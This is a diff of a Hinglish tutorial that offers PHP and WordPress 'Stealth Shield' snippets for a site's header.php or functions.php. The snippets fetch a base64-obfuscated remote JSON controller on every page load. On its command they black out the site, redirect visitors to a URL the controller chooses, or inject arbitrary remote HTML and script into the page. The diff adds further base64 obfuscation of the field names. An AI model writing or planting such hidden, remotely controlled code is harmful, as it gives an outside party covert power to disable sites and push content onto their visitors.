@@ -101,86 +101,87 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
 **Kahan lagayein:** Website ki main file (e.g., `header.php`) ke sabse top par.
 
 ```php
-
 <?php
-/* --- PHP STEALTH SHIELD V10 (FIXED FOR CUSTOM CODE) --- */
+/* --- PHP STEALTH SHIELD V10 (FULLY ENCRYPTED) --- */
 function _sys_sync_final_v10(){
-    // Base64 Encoded URL and Key
+    // Configuration Encrypted
     $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
     $_k = base64_decode("RkFIQUQtNzg2"); // Key: FAHAD-786
     
+    // Key Mappings Encrypted
+    $_f = [
+        'l' => base64_decode("bGljZW5zZXM="),        // licenses
+        's' => base64_decode("c2V0dGluZ3M="),        // settings
+        'e' => base64_decode("ZXhwaXJ5"),            // expiry
+        'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="), // authorized_target
+        'c' => base64_decode("Y3VzdG9tX2NvZGU="),    // custom_code
+        'en' => base64_decode("ZW5hYmxlZA=="),       // enabled
+        'co' => base64_decode("Y29kZQ=="),           // code
+        're' => base64_decode("cmVkaXJlY3RfZW5hYmxlZA=="), // redirect_enabled
+        'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    // redirect_url
+        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), // redirect_delay_sec
+        'mi' => base64_decode("bXNnX2ludmFsaWQ="),    // msg_invalid
+        'me' => base64_decode("bXNnX2V4cGlyZWQ="),    // msg_expired
+        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="), // msg_domain_mismatch
+        'lbl' => base64_decode("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="), // Redirecting label
+        'lbl2' => base64_decode("c2Vjb25kcy4uLg==")   // seconds label
+    ];
+
     $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']);
     $_ctx = stream_context_create(["http" => ["timeout" => 5]]); 
-    
-    // Fetch JSON with anti-cache
     $_r = @file_get_contents($_u . "?v=" . time(), false, $_ctx);
     
     if ($_r) {
         $_d = json_decode($_r, true);
-        $_l = $_d['licenses'][$_k] ?? null; 
-        $_s = $_d['settings'] ?? [];
+        $_l = $_d[$_f['l']][$_k] ?? null; 
+        $_s = $_d[$_f['s']] ?? [];
         $_t = date("Y-m-d");
         
         $_err = null;
-        $_is_custom = false;
+        $_is_c = false;
 
-        // --- STEP 1: Priority Check (Custom Code Enabled?) ---
-        if ($_l && isset($_l['custom_code']) && $_l['custom_code']['enabled'] === true) {
-            $_err = $_l['custom_code']['code']; // Stylish HTML uthayein
-            $_is_custom = true;
+        // Priority Check (Custom Code)
+        if ($_l && isset($_l[$_f['c']]) && $_l[$_f['c']][$_f['en']] === true) {
+            $_err = $_l[$_f['c']][$_f['co']];
+            $_is_c = true;
         } 
-        // --- STEP 2: Normal License Validation ---
         else {
-            if (!$_l) { 
-                $_err = $_d['msg_invalid']; 
-            }
-            elseif (!empty($_l['authorized_target']) && !in_array($_h, $_l['authorized_target'])) { 
-                $_err = $_d['msg_domain_mismatch']; 
-            }
-            elseif (isset($_l['expiry']) && $_t > $_l['expiry']) { 
-                $_err = $_d['msg_expired']; 
-            }
+            if (!$_l) { $_err = $_d[$_f['mi']]; }
+            elseif (!empty($_l[$_f['a']]) && !in_array($_h, $_l[$_f['a']])) { $_err = $_d[$_f['md']]; }
+            elseif (isset($_l[$_f['e']]) && $_t > $_l[$_f['e']]) { $_err = $_d[$_f['me']]; }
         }
 
-        // --- STEP 3: Display Block Screen if Error or Custom Code exists ---
         if ($_err) {
-            $_delay = $_s['redirect_delay_sec'] ?? 20;
-            $_url = $_s['redirect_url'] ?? "#";
+            $_dly = $_s[$_f['rd']] ?? 20;
+            $_url = $_s[$_f['ru']] ?? "#";
             $_title = $_d['title'] ?? "Security Shield Active";
-
-            // Agar custom message hai toh redirect timer hide rakhein (Optional)
-            $_timer_style = $_is_custom ? "display:none;" : "display:block;";
+            $_t_style = $_is_c ? "display:none;" : "display:block;";
 
             die("<style>
                 body{margin:0;background:#000;overflow:hidden;}
                 #ov{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:2147483647;}
                 .bx{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
                 h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
-                .msg-cont{color:#bbb;font-size:17px;line-height:1.6;}
-                .tr{margin-top:25px;border-top:1px solid #111;padding-top:20px;color:#666;font-size:13px; {$_timer_style} }
+                .mc{color:#bbb;font-size:17px;line-height:1.6;}
+                .tr{margin-top:25px;border-top:1px solid #111;padding-top:20px;color:#666;font-size:13px; {$_t_style} }
                 #tm{color:#fff;font-weight:bold;font-size:18px;}
             </style>
-            <div id='ov'>
-                <div class='bx'>
-                    <h1>{$_title}</h1>
-                    <div class='msg-cont'>{$_err}</div>
-                    <div class='tr' id='tr_box'>Redirecting automatically in <span id='tm'>{$_delay}</span> seconds...</div>
-                </div>
-            </div>
+            <div id='ov'><div class='bx'>
+                <h1>{$_title}</h1>
+                <div class='mc'>{$_err}</div>
+                <div class='tr'>{$_f['lbl']} <span id='tm'>{$_dly}</span> {$_f['lbl2']}</div>
+            </div></div>
             <script>
-                let s={$_delay};
-                let isCustom = " . ($_is_custom ? 'true' : 'false') . ";
-                if(!isCustom){
+                let s={$_dly}, ic=" . ($_is_c ? '1' : '0') . ";
+                if(ic=='0'){
                     let it=setInterval(()=>{
-                        s--;
-                        document.getElementById('tm').innerText=s;
+                        s--; document.getElementById('tm').innerText=s;
                         if(s<=0){ clearInterval(it); window.location.href='{$_url}'; }
                     },1000);
                 }
             </script>");
         }
 
-        // Google Analytics
         if (!empty($_s['analytics_id'])) {
             echo "<script async src='https://www.googletagmanager.com/gtag/js?id={$_s['analytics_id']}'></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','{$_s['analytics_id']}');</script>";
         }
@@ -188,6 +189,9 @@ function _sys_sync_final_v10(){
 }
 _sys_sync_final_v10();
 ?>
+
+
+
 
 ```
 
@@ -198,100 +202,103 @@ _sys_sync_final_v10();
 **Kahan lagayein:** Theme ki `functions.php` file mein sabse niche.
 
 ```php
-/* --- WP STEALTH SHIELD V10 (FIXED FOR CUSTOM CODE) --- */
+
+/* --- WP STEALTH SHIELD V10 (FULLY ENCRYPTED) --- */
 add_action('init', '_wp_secure_v10_stealth');
 function _wp_secure_v10_stealth() {
-    // Admin dashboard block nahi hoga taaki aap access na kho dein
     if (is_admin()) return;
 
-    // URL aur Key (Base64)
+    // Configuration Encrypted
     $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
     $_k = base64_decode("RkFIQUQtNzg2"); 
     
-    // Remote fetch using WP API
+    // Key Mappings Encrypted
+    $_f = [
+        'l' => base64_decode("bGljZW5zZXM="),        
+        's' => base64_decode("c2V0dGluZ3M="),        
+        'e' => base64_decode("ZXhwaXJ5"),            
+        'a' => base64_decode("YXV0aG9yaXplZF90YXJnZXQ="), 
+        'c' => base64_decode("Y3VzdG9tX2NvZGU="),    
+        'en' => base64_decode("ZW5hYmxlZA=="),       
+        'co' => base64_decode("Y29kZQ=="),           
+        'rd' => base64_decode("cmVkaXJlY3RfZGVsYXlfc2Vj"), 
+        'ru' => base64_decode("cmVkaXJlY3RfdXJs"),    
+        'mi' => base64_decode("bXNnX2ludmFsaWQ="),    
+        'me' => base64_decode("bXNnX2V4cGlyZWQ="),    
+        'md' => base64_decode("bXNnX2RvbWFpbl9taXNtYXRjaA=="), 
+        'lb1' => base64_decode("UmVkaXJlY3RpbmcgYXV0b21hdGljYWxseSBpbg=="),
+        'lb2' => base64_decode("c2Vjb25kcy4uLg==")
+    ];
+
     $r = wp_remote_get($_u . '?v=' . time(), array('timeout' => 5));
     if (is_wp_error($r)) return;
 
     $d = json_decode(wp_remote_retrieve_body($r), true);
-    
-    // Data setup
-    $_l = $d['licenses'][$_k] ?? null; 
-    $_s = $d['settings'] ?? []; 
+    $_l = $d[$_f['l']][$_k] ?? null; 
+    $_s = $d[$_f['s']] ?? []; 
     $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']); 
     $_t = date("Y-m-d");
 
     $err = null;
-    $_is_custom = false;
+    $_is_c = false;
 
-    // --- STEP 1: Priority Check (Custom Code Enabled?) ---
-    if ($_l && isset($_l['custom_code']) && $_l['custom_code']['enabled'] === true) {
-        $err = $_l['custom_code']['code']; // Stylish HTML code uthayega
-        $_is_custom = true;
+    // Step 1: Priority Check (Custom Code)
+    if ($_l && isset($_l[$_f['c']]) && $_l[$_f['c']][$_f['en']] === true) {
+        $err = $_l[$_f['c']][$_f['co']];
+        $_is_c = true;
     } 
-    // --- STEP 2: Normal License Validation ---
+    // Step 2: Validation
     else {
-        if (!$_l) { 
-            $err = $d['msg_invalid']; 
-        }
-        elseif (!empty($_l['authorized_target']) && !in_array($_h, $_l['authorized_target'])) { 
-            $err = $d['msg_domain_mismatch']; 
-        }
-        elseif (isset($_l['expiry']) && $_t > $_l['expiry']) { 
-            $err = $d['msg_expired']; 
-        }
+        if (!$_l) { $err = $d[$_f['mi']]; }
+        elseif (!empty($_l[$_f['a']]) && !in_array($_h, $_l[$_f['a']])) { $err = $d[$_f['md']]; }
+        elseif (isset($_l[$_f['e']]) && $_t > $_l[$_f['e']]) { $err = $d[$_f['me']]; }
     }
 
     if ($err) {
-        $de = $_s['redirect_delay_sec'] ?? 20; 
-        $ur = $_s['redirect_url'] ?? "#";
-        $title = $d['title'] ?? "Security Shield Active";
-        $timer_display = $_is_custom ? "display:none;" : "display:block;";
+        $_dly = $_s[$_f['rd']] ?? 20; 
+        $_url = $_s[$_f['ru']] ?? "#";
+        $_tit = $d['title'] ?? "Security Shield Active";
+        $_t_style = $_is_c ? "display:none;" : "display:block;";
 
         echo "<style>
             body{margin:0;background:#000!important;overflow:hidden!important;}
             #wp_v10{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:9999999;}
             .in{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;background:#050505;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
             h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
-            .msg-body{color:#bbb;font-size:17px;line-height:1.6;}
-            .tr{margin-top:30px;border-top:1px solid #1a1a1a;padding-top:20px;color:#555;font-size:13px; {$timer_display} }
+            .mb{color:#bbb;font-size:17px;line-height:1.6;}
+            .tr{margin-top:30px;border-top:1px solid #1a1a1a;padding-top:20px;color:#555;font-size:13px; {$_t_style} }
             #vt{color:#fff;font-weight:bold;font-size:18px;}
         </style>
         <div id='wp_v10'>
             <div class='in'>
-                <h1>{$title}</h1>
-                <div class='msg-body'>{$err}</div>
-                <div class='tr'>Redirecting automatically in <span id='vt'>{$de}</span>s...</div>
+                <h1>{$_tit}</h1>
+                <div class='mb'>{$err}</div>
+                <div class='tr'>{$_f['lb1']} <span id='vt'>{$_dly}</span> {$_f['lb2']}</div>
             </div>
         </div>
         <script>
-            let s = {$de};
-            let isCustom = " . ($_is_custom ? 'true' : 'false') . ";
-            if(!isCustom){
+            let s = {$_dly}, ic = " . ($_is_c ? '1' : '0') . ";
+            if(ic == '0'){
                 let it = setInterval(()=>{
                     s--;
                     let el = document.getElementById('vt');
                     if(el) el.innerText = s;
-                    if(s <= 0){ clearInterval(it); window.location.href='{$ur}'; }
+                    if(s <= 0){ clearInterval(it); window.location.href='{$_url}'; }
                 }, 1000);
             }
         </script>";
         exit;
     }
 
-    // Google Analytics Integration
     if (!empty($_s['analytics_id'])) {
         add_action('wp_head', function() use ($_s) {
             $id = $_s['analytics_id'];
             echo "<script async src='https://www.googletagmanager.com/gtag/js?id={$id}'></script>
-            <script>
-                window.dataLayer=window.dataLayer||[];
-                function gtag(){dataLayer.push(arguments);}
-                gtag('js',new Date());
-                gtag('config','{$id}');
-            </script>";
+            <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','{$id}');</script>";
         });
     }
 }
+
 
 ```
 
